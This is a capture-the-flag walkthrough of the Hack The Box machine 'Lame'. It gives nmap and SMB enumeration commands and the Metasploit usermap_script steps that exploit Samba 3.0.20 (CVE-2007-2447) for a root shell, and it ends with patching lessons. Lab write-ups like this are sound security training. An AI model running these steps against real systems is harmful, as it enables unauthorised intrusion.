# Hack The Box - Lame

## Machine Information

| Field            | Details                                                                 |
| ---------------- | ----------------------------------------------------------------------- |
| Platform         | Hack The Box                                                            |
| Machine          | Lame                                                                    |
| Difficulty       | Easy                                                                    |
| Operating System | Linux                                                                   |
| Category         | Network Exploitation, Privilege Escalation                              |
| Main Skills      | Service enumeration, Samba exploitation, FTP analysis, Metasploit usage |

---

# Overview

Lame is one of the first Hack The Box machines and demonstrates the importance of proper service enumeration.

The machine contains outdated services with known vulnerabilities that allow remote code execution and complete system compromise.

The attack path includes:

* Port scanning
* Service enumeration
* Samba exploitation
* Remote shell access
* Root privilege escalation

---

# Reconnaissance

The first step was identifying exposed services.

## Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed several open ports:

```text
21/tcp   FTP
22/tcp   SSH
139/tcp  NetBIOS
445/tcp  SMB
```

The running services were analyzed for potential vulnerabilities.

---

# Service Enumeration

## FTP

The FTP service was checked for anonymous access:

```bash
ftp <TARGET_IP>
```

No useful access was discovered.

---

## SMB Enumeration

The SMB service was investigated:

```bash
smbclient -L //<TARGET_IP>
```

The service version was identified.

The SMB version was outdated and vulnerable.

---

# Vulnerability Discovery

The SMB service was running a vulnerable version of Samba.

The vulnerability allowed remote code execution without authentication.

The affected service was:

```text
Samba 3.0.20
```

The vulnerability is commonly known as:

```text
CVE-2007-2447
```

---

# Exploitation

The vulnerability was exploited using Metasploit.

Starting Metasploit:

```bash
msfconsole
```

Searching for the exploit:

```bash
search samba usermap script
```

Loading the exploit:

```bash
use exploit/multi/samba/usermap_script
```

Configuring the target:

```bash
set RHOSTS <TARGET_IP>
```

Running the exploit:

```bash
run
```

A remote shell was obtained.

---

# User Enumeration

After gaining access:

```bash
whoami
```

The result showed:

```text
root
```

The machine was already compromised with administrative privileges.

---

# Root Access

The root flag was retrieved from:

```bash
/root/root.txt
```

The user flag was retrieved from the user's home directory.

---

# Tools Used

* Nmap
* SMBClient
* Metasploit
* Linux enumeration tools

---

# Vulnerabilities Identified

## Samba Remote Code Execution

**Type:** Remote Code Execution

**CVE:** CVE-2007-2447

**Impact:**

An attacker can execute arbitrary commands remotely and gain full control of the system.

---

# Lessons Learned

* Always enumerate all exposed services.
* Outdated services should be patched immediately.
* Version information can reveal known vulnerabilities.
* Network-facing services are common attack entry points.
